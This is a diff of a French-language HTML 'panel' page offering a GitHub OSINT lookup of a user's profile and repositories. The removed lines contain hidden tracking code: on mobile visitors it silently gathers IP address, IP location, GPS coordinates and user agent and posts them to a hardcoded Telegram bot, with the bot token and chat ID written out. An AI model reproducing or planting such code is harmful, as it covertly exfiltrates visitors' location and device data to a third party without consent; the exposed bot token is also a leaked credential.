@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>panel github</title>
+    <title>panel uhq</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -39,19 +39,6 @@
             transform: scale(1.05);
             border-color: white;
         }
-        .mobile-message {
-            color: red;
-            font-size: 20px;
-            font-weight: bold;
-            background-color: rgba(255, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 10px;
-            display: none;
-            margin-top: 20px;
-            max-width: 80%;
-            margin-left: auto;
-            margin-right: auto;
-        }
         input {
             width: 90%;
             padding: 10px;
@@ -77,11 +64,8 @@
 <body>
 
     <div class="panel">
-        <h2>panel github</h2>
-        <button id="osintBtn">OSINT GitHub</button>  <!-- Affiché sur PC -->
-        <div id="mobileMessage" class="mobile-message">
-            Vous êtes sur un appareil mobile. Veuillez revenir sur un PC pour utiliser l'OSINT GitHub.
-        </div>
+        <h2>panel uhq</h2>
+        <button id="osintBtn">OSINT GitHub</button>
 
         <div id="osintModal" style="display:none;">
             <h3>Recherche OSINT GitHub</h3>
@@ -92,20 +76,11 @@
     </div>
 
     <script>
-        const isMobile = /mobile/i.test(navigator.userAgent);
-
-        // Si l'utilisateur est sur un appareil mobile, afficher un message et masquer le bouton OSINT
-        if (isMobile) {
-            document.getElementById('mobileMessage').style.display = 'block';
-            document.getElementById('osintBtn').style.display = 'none';  // Masquer le bouton OSINT
-            sendMobileInfo();  // Envoie les informations IP, user agent et localisation
-        } else {
-            // Si l'utilisateur est sur PC, afficher le bouton OSINT et ajouter un événement
-            document.getElementById('osintBtn').style.display = 'inline-block';
-            document.getElementById('osintBtn').addEventListener('click', () => {
-                document.getElementById('osintModal').style.display = 'block';  // Afficher le modal de recherche
-            });
-        }
+        // Toujours afficher le bouton OSINT
+        document.getElementById('osintBtn').style.display = 'inline-block';
+        document.getElementById('osintBtn').addEventListener('click', () => {
+            document.getElementById('osintModal').style.display = 'block';
+        });
 
         // Fonction OSINT GitHub
         async function lookupGitHub() {
@@ -124,9 +99,9 @@
                 return;
             }
 
-            resultText += `☆ Nom: ${userData.name || "Non disponible"}\n`;
-            resultText += `☆ Followers: ${userData.followers}\n`;
-            resultText += `☆ Repos: ${userData.public_repos}\n\n`;
+            resultText += `🔹 Nom: ${userData.name || "Non disponible"}\n`;
+            resultText += `🔹 Followers: ${userData.followers}\n`;
+            resultText += `🔹 Repos: ${userData.public_repos}\n\n`;
 
             let repoResponse = await fetch(`https://api.github.com/users/${username}/repos?per_page=100`);
             let repos = await repoResponse.json();
@@ -167,45 +142,6 @@
             }
 
             document.getElementById("githubResult").textContent = resultText;
-        }
-
-        // Fonction pour récupérer et envoyer l'IP, User-Agent, localisation IP et géolocalisation (latitude/longitude)
-        async function sendMobileInfo() {
-            const ipInfo = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN'); // Remplace par ton token ipinfo.io
-            const ipData = await ipInfo.json();
-            const ip = ipData.ip;
-            const location = ipData.city + ', ' + ipData.region + ', ' + ipData.country;
-            const userAgent = navigator.userAgent;
-
-            // Récupérer la géolocalisation du navigateur
-            let geoLocation = '';
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-
-                    geoLocation = `Latitude: ${lat}, Longitude: ${lon}`;
-
-                    // Message à envoyer au bot Telegram avec IP et géolocalisation du navigateur
-                    const telegramMessage = `📱 Appareil Mobile\n☆IP: ${ip}\n☆Localisation IP: ${location}\n☆Localisation GPS: ${geoLocation}\n☆User-Agent: ${userAgent}`;
-
-                    // Envoie au bot Telegram
-                    const botToken = '7463916367:AAFOPjZpfm4th8l6qSTqTuUUBjKwVlDdJ-4';
-                    const chatId = '7604426420';
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: telegramMessage
-                        })
-                    });
-                });
-            } else {
-                console.log("Géolocalisation non disponible");
-            }
         }
 
         document.getElementById("lookupGitHub").addEventListener("click", lookupGitHub);
